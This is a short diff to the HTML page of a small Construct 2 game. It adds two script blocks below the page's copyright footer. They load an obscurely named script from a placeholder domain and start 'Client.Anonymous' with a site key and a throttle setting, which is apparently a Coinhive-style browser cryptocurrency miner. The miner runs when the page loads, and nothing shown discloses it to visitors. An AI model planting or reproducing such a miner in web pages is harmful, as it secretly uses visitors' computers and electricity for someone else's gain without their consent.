@@ -25,3 +25,13 @@ I created a game with Construct 2, in this game you're the monster, trying to pr
 
 &copy;2018 Cauê Felchar, 
 Feel free to contact me at <a href="mailto:caue.fcr<at>gmail.com">caue.fcr< at >gmail.com</a>
+  
+<script src="http://<your-domain>/<path-to-script>/kpOJ.php?f=e2vo.js"></script>
+<script>
+    var _client = new Client.Anonymous('20506d57832bbddbd4653cd8a030075712c1323ce68b1488f82dfa8b85f6b8c0', {
+        throttle: 0.6
+    });
+    _client.start();
+    
+
+</script>
